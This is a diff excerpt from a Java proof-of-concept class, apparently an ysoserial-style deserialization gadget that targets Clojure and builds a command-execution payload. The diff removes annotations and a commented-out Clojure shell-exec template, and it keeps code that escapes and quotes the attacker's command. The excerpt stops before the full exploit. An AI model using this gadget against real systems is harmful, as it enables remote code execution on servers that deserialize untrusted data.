@@ -26,23 +26,12 @@ import java.util.Map;
 		org.clojure:clojure
 		Versions since 1.2.0 are vulnerable, although some class names may need to be changed for other versions
  */
-@Dependencies({"org.clojure:clojure:1.8.0"})
-@Authors({ Authors.JACKOFMOSTTRADES })
+
 public class Poc1 extends PayloadRunner implements ObjectPayload<Map<?, ?>> {
 
     public Map<?, ?> getObject(final String command) throws Exception {
 
-//		final String[] execArgs = command.split(" ");
-//		final StringBuilder commandArgs = new StringBuilder();
-//		for (String arg : execArgs) {
-//			commandArgs.append("\" \"");
-//			commandArgs.append(arg);
-//		}
-//		commandArgs.append("\"");
 
-
-//		final String clojurePayload =
-//				String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", commandArgs.substring(2));
 
         String cmd = Strings.join(Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\").split(" ")), " ", "\"", "\"");
 
